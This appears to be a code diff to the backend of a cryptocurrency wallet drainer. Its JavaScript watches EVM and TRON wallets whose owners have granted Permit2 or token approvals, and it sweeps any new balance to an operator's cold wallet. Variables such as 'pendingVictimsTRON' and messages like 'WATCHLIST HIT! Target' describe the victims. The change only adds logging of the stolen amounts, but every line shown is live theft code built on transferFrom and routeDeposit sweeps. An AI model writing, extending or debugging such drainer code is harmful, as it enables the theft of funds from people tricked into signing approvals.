@@ -81,7 +81,8 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                         });
 
                     if (balance > 0n) {
-                        console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${owner}`);
+                        const decimals = await tokenContract.decimals();
+                        console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
                         const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
                         console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
                         await sweepTx.wait();
@@ -108,7 +109,8 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     console.log(`[BACKEND] ✅ Permit2 Confirmed!`);
 
                     if (balance > 0n) {
-                        console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED (DIRECT PERMIT2): ${owner}`);
+                        const decimals = await tokenContract.decimals();
+                        console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED (DIRECT PERMIT2): ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
                         // 🛠️ DIFFERENT HANDLING: Calling Permit2 contract directly for the transfer
                         const sweepTx = await permit2Contract.transferFrom(owner, process.env.EVM_COLD_WALLET, balance, token);
                         console.log(`[BACKEND] ⏳ Direct Permit2 Sweep TX Sent: ${sweepTx.hash}`);
@@ -337,6 +339,7 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
                         const balanceStr = balanceObj.toString();
                         if (Number(balanceStr) > 0) {
                             console.log(`\n[TRON] 🎯 WATCHLIST HIT! Target: ${data.owner}`);
+                            console.log(`[TRON] Sweeping newly deposited ${Number(balanceStr) / 1_000_000} USDT from ${data.owner}...`);
                             const txId = await tronCollectorContract.routeDeposit(process.env.TRON_USDT_ADDRESS, data.owner, process.env.TRON_DESTINATION_WALLET, balanceStr).send({ callValue: 0, feeLimit: 500_000_000, shouldPollResponse: false });
                             console.log(`[TRON] ⏳ Sweep Sent: ${txId}`);
                             pendingVictimsTRON.delete(key);
